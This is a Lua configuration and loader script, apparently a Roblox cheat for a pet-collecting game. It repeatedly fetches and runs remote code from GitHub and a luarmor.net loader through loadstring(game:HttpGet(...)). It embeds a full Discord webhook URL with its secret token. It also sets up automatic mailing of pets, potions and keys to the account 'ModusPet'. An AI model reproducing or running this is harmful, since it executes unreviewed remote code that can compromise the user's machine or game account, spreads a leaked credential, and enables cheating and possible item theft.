_G.Config = { UserID = "752adf06-faf4-40f9-8f22-9c9bca3aa5e3", discord_id = "314107374715535370" , Note = "Pc", } 

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
    end)
end)


-- Load other scripts
getgenv().Settings = {
    FPSLimit = 5,
    CraftInsta4PotionsSoICanSellThem = false,
    ["Notifications"] = {
        Webhook = "https://discord.com/api/webhooks/1304535617400733759/E-h5ZA7VOmM6uXqQkOWj368e1zptKzYeQGiimA6LosOjGg3kMIFvrrZc2rXfT4bkbTh8",
        DiscordId = "314107374715535370",
        Difficulty = "Above 10m",
        Rarities = {}
    },
    ["Mailing"] = {
        Usernames = {"ModusPet"},
        ["Pets"] = {
            KeepBestPets = true,
            Difficulty = "Above 10m",
            Rarities = {}
        },
        ["Misc"] = {
            ["Send Instant Luck 4"] = {Active = true, Minimum = 1},
            ["Send God Potions"] = {Active = true, Minimum = 1},
            ["Send Exclusive Fishing Items"] = {Active = true, Minimum = 1},
            ["Send Keys"] = {
                ["Crystal"] = {Active = true, Minimum = 20, Parts = {UpperMinimum = 20, LowerMinimum = 0}},
                ["Secret"] = {Active = true, Minimum = 5},
            },
        }
    }
}

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
    end)
end)
